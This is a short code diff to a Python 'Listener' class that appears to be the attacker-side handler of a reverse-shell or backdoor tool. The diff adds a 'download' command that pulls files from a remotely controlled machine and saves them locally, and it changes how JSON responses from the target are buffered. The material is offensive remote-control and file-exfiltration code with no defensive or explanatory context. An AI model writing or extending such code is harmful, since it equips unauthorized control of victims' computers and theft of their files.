@@ -20,7 +20,7 @@ class Listener:
         json_data = ""
         while True:
             try:
-                json_data = self.conn.recv(1024)
+                json_data = json_data + str(self.conn.recv(1024))
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -32,11 +32,18 @@ class Listener:
             exit()
         return self.reliable_receive()
 
+    def write_file(self, path, content):
+        with open(path, "w") as file:
+            file.write(content)
+            return "[+] Downloaded successfully"
+
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
             command_result = self.execute_remotely(command)
+            if command[0] == "download":
+                command_result = self.write_file(command[1], command_result)
             print(command_result)
 
 
